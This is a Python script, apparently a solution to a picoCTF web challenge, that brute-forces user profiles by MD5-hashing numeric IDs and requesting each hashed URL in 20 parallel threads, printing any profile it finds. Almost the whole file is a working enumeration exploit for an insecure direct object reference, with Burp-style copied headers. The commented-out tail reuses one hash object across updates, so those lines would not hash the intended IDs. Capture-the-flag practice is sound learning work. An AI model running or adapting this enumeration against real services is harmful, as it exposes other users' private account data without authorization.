import requests
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed

# Create a session for connection pooling
session = requests.Session()

def send_request(url):
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1", "Priority": "u=0, i"}
    try:
        data = session.get(url, headers=burp0_headers, timeout=10)
        return data.text
    except Exception as e:
        return f"error: {e}"

def check_user(i):
    burp0_url = "http://crystal-peak.picoctf.net:65415/profile/user/"
    # Create a new MD5 hash for each user ID
    md5_hash = hashlib.md5()
    md5_hash.update(str(i).encode('utf-8'))
    payload = burp0_url + md5_hash.hexdigest()
    response = send_request(payload)
    
    if 'not found' not in response:
        return i, True, response
    else:
        return i, False, None

# Use ThreadPoolExecutor for parallel requests (20 threads)
with ThreadPoolExecutor(max_workers=20) as executor:
    futures = {executor.submit(check_user, i): i for i in range(1, 9999) if i != 3000}
    
    for future in as_completed(futures):
        i, found, response = future.result()
        if found:
            print(f"FOUND: {i}")
            print(response[:200])  # Print first 200 chars of response
        else:
            print(f"Testing {i}...")

# md5_hash.update(str(3000).encode('utf-8'))
# payload = burp0_url + md5_hash.hexdigest()
# if 'not found' not in send_request(payload):
#     print(send_request(payload))
#     print(3000)
    
# md5_hash.update(str(3001).encode('utf-8'))
# payload = burp0_url + md5_hash.hexdigest()
# if 'not found' not in send_request(payload):
#     print(send_request(payload))
#     print(3001)